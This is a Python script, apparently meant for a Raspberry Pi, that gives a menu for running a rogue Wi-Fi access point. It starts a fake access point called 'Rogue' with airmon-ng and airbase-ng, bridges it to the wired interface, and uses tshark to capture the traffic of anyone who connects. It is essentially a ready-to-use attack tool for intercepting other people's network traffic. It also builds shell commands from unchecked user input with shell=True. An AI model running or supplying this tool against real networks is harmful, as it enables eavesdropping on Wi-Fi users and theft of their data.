#!/usr/bin/python3

import subprocess

def rogue():
    iface= input("Interface name: ")
    subprocess.call('sudo airmon-ng start '+iface, shell=True)
    subprocess.call('sudo airbase-ng --essid Rogue -c 1 '+iface+'mon', shell=True)

def bridge():
    subprocess.call('sudo brctl addbr Wifi-Bridge', shell=True)
    subprocess.call('sudo brctl addif Wifi-Bridge eth0', shell=True)
    subprocess.call('sudo brctl addif Wifi-Bridge at0', shell=True)

def sniff():
    subprocess.call('tshark -i at0 -q -w output.pcap', shell=True)

banner=("""\033[1;31m
________                                _______________                            
___  __ \____________ ____  ______      ___    |__  __ \                           
__  /_/ /  __ \_  __ `/  / / /  _ \     __  /| |_  /_/ /                           
_  _, _// /_/ /  /_/ // /_/ //  __/     _  ___ |  ____/                            
/_/ |_| \____/_\__, / \__,_/ \___/      /_/  |_/_/                                 
              /____/                                                               
________                      ______                                 _____________ 
___  __ \_____ __________________  /_________________________  __    ___  __ \__(_)
__  /_/ /  __ `/_  ___/__  __ \_  __ \  _ \_  ___/_  ___/_  / / /    __  /_/ /_  / 
_  _, _// /_/ /_(__  )__  /_/ /  /_/ /  __/  /   _  /   _  /_/ /     _  ____/_  /  
/_/ |_| \__,_/ /____/ _  .___//_.___/\___//_/    /_/    _\__, /      /_/     /_/   
                      /_/                               /____/                     
\033[1;31m
""")

while(True):
    subprocess.call('clear', shell=True)
    print(banner)
    print("""1- Launch Rogue AP
2- Build the bridge 
3- Start Snif
4- Exit
        """)

    op1 = input(">> ")
    if op1 == '1':
        rogue()
    elif op1 == '2':
        bridge()
    elif op1 == '3':
        sniff()
    elif op1 == '4':
        break
    else:
        print ("Select a correct option")

